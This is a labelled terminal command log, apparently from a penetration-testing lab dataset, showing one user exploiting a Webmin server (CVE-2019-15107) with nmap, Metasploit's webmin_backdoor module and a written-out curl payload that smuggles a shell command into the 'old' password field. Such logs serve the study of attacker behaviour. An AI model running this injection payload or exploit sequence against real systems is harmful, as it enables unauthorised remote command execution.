User 71 start time 1594797652 end 1594802467
PADDING
PADDING
PADDING
INPUT|71--0|M0 |1594797652|71|nmap 172.18.1.5|OUTPUT
INPUT|71--1|U|1594797796|71|metasploit|OUTPUT
INPUT|71--2|U|1594797894|71|metasploit|OUTPUT
INPUT|71--3|M2 |1594797992|71|msfconsole|OUTPUT
INPUT|71--4|U|1594798012|71|msfconsole|OUTPUT
INPUT|71--5|U|1594798026|71|sudo service postgresql start|OUTPUT
INPUT|71--6|U|1594798034|71|msfdb init|OUTPUT
INPUT|71--7|U|1594798073|71|msfconsole|OUTPUT
INPUT|71--8|A1 |1594798128|71|db_nmap 172.18.1.5|OUTPUT
INPUT|71--9|U|1594798235|71|help|OUTPUT
INPUT|71--10|U|1594798283|71|analyze|OUTPUT
INPUT|71--11|M8 |1594798905|71|show exploits|OUTPUT
INPUT|71--12|U|1594799095|71|cd Downloads/|OUTPUT
INPUT|71--13|A10 |1594799096|71|ls|OUTPUT
INPUT|71--14|A15 |1594799173|71|chmod|OUTPUT
INPUT|71--15|A15 |1594799179|71|chmod +x 47293.sh|OUTPUT
INPUT|71--16|U|1594799182|71|./47293.sh|OUTPUT
INPUT|71--17|U|1594799188|71|vi 47293.sh|OUTPUT
INPUT|71--18|U|1594799205|71|cd Downloads/|OUTPUT
INPUT|71--19|U|1594799308|71|./47293.sh 47293.sh http://172.18.1.5:10000/|OUTPUT
INPUT|71--20|U|1594799311|71|./47293.sh 47293.sh http://172.18.1.5:10000|OUTPUT
INPUT|71--21|U|1594799365|71|sh 47293.sh 47293.sh http://172.18.1.5:10000|OUTPUT
INPUT|71--22|U|1594799410|71|sh 47293.sh 47293.sh http://172.18.1.5:10000|OUTPUT
INPUT|71--23|A1 A9 A11 A12 A17 |1594799422|71|cat 47293.sh|OUTPUT
INPUT|71--24|U|1594799442|71|sh 47293.sh 47293.sh http://172.18.1.5:10000|OUTPUT
INPUT|71--25|U|1594799481|71|vim CVE-2019-15107.sh|OUTPUT
INPUT|71--26|U|1594799513|71|sh CVE-2019-15107.sh|OUTPUT
INPUT|71--27|U|1594799525|71|sh CVE-2019-15107.sh #!/bin/sh|OUTPUT
INPUT|71--28|U|1594799525|71|FLAG=f3a0c13c3765137bcde68572707ae5c0|OUTPUT
INPUT|71--29|U|1594799525|71|URI=$1;|OUTPUT
INPUT|71--30|U|1594799525|71|echo -n Testing for RCE (CVE-2019-15107) on $URI: ;|OUTPUT
INPUT|71--31|A1 A4 A9 A11 A12 A17 |1594799525|71|curl -ks $URI'/password_change.cgi' -d 'user=wheel&pam=&expired=2&old=id|echo '$FLAG'&new1=wheel&new2=wheel' -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' -H Content-Type: application/x-www-form-urlencoded -H 'Referer: '$URI'/session_login.cgi'|grep $FLAG>/dev/null 2>&1|OUTPUT
INPUT|71--32|A10 |1594799525|71|if [ $? -eq 0 ]; then echo '033[0;31mVULNERABLE!033[0m'; else echo '033[0;32mOK! (target is not vulnerable)033[0m'; fi|OUTPUT
INPUT|71--33|A10 |1594799530|71|ls|OUTPUT
INPUT|71--34|A1 A9 A11 A12 A17 |1594799535|71|cat CVE-2019-15107.sh|OUTPUT
INPUT|71--35|A1 A9 A11 A12 A17 |1594799557|71|cat CVE-2019-15107.sh http://172.18.1.5:10000|OUTPUT
INPUT|71--36|U|1594799567|71|sh CVE-2019-15107.sh http://172.18.1.5:10000|OUTPUT
INPUT|71--37|U|1594799594|71|msfconsole|OUTPUT
INPUT|71--38|U|1594799625|71|exit|OUTPUT
INPUT|71--39|U|1594799628|71|msfcli|OUTPUT
INPUT|71--40|U|1594799634|71|msfconsole|OUTPUT
INPUT|71--41|A5 |1594799712|71|show exploit|OUTPUT
INPUT|71--42|A3 |1594799745|71|search CVE-2019-15107|OUTPUT
INPUT|71--43|M4 |1594799768|71|use exploit/unix/webapp/webmin_backdoor |OUTPUT
INPUT|71--44|A7 |1594799770|71|check|OUTPUT
INPUT|71--45|M6 |1594799783|71|set RHOSTS https://localhost:10000|OUTPUT
INPUT|71--46|U|1594799797|71|set RHOST https://localhost:10000|OUTPUT
INPUT|71--47|M5 |1594799819|71|show options|OUTPUT
INPUT|71--48|U|1594799837|71|set RHOST 172.18.1.5|OUTPUT
INPUT|71--49|U|1594799839|71|show options|OUTPUT
INPUT|71--50|A7 |1594799844|71|check|OUTPUT
INPUT|71--51|U|1594799847|71|exploit|OUTPUT
INPUT|71--52|A7 |1594799880|71|check|OUTPUT
INPUT|71--53|U|1594799881|71|exploit|OUTPUT
INPUT|71--54|U|1594799895|71|set LHOST 0.0.0.0|OUTPUT
INPUT|71--55|U|1594799900|71|exploit|OUTPUT
INPUT|71--56|U|1594799919|71|show|OUTPUT
INPUT|71--57|U|1594799930|71|show options|OUTPUT
INPUT|71--58|U|1594799952|71|exploit|OUTPUT
INPUT|71--59|U|1594800016|71|set LHOST 10.1.135.83|OUTPUT
INPUT|71--60|U|1594800044|71|exploit|OUTPUT
INPUT|71--61|U|1594800092|71|msfconsole|OUTPUT
INPUT|71--62|A7 |1594800089|71|check|OUTPUT
INPUT|71--63|U|1594800090|71|exit|OUTPUT
INPUT|71--64|U|1594800143|71|use exploit/unix/webapp/webmin_backdoor|OUTPUT
INPUT|71--65|U|1594800152|71|set RHOST 172.18.1.5|OUTPUT
INPUT|71--66|U|1594800167|71|set LHOST 10.1.135.83|OUTPUT
INPUT|71--67|A7 |1594800170|71|check|OUTPUT
INPUT|71--68|A16 |1594800245|71|ssh 172.18.1.5|OUTPUT
INPUT|71--69|A16 |1594800263|71|ssh 172.18.1.5:39680|OUTPUT
INPUT|71--70|A16 |1594800272|71|ssh localhost:4444|OUTPUT
INPUT|71--71|A16 |1594800284|71|ssh 127.0.0.1:4444|OUTPUT
INPUT|71--72|A16 |1594800293|71|ssh 127.0.0.1 -p 4444|OUTPUT
INPUT|71--73|U|1594800308|71|msfconsole|OUTPUT
INPUT|71--74|U|1594800340|71|use exploit/unix/webapp/webmin_backdoor |OUTPUT
